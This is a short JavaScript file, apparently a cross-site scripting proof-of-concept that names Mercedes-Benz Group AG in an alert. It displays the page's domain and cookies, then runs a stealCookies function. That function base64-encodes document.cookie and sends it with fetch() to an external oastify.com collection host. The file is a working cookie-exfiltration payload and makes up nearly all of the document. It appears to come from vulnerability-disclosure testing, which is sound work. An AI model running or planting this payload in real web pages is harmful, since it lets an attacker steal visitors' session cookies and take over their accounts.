alert("Hi Mercedes-Benz Group AG!We run XSS code here and can steal cookies of victim and send it to https://bcrsweta3cja1n7ra673qlbvlmrdf93y.oastify.com domain.");
alert(document.domain);
alert(document.cookie);
function stealCookies(){
  const url = 'https://bcrsweta3cja1n7ra673qlbvlmrdf93y.oastify.com/?cookies=' + btoa(document.cookie)
  const response = fetch(url)
}

function getCookie(cname)
{
  var name = cname + "=";
  var ca = document.cookie.split(';');
  for(var i=0; i<ca.length; i++) 
  {
    var c = ca[i].trim();
    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
  }
  return "";
}
stealCookies();
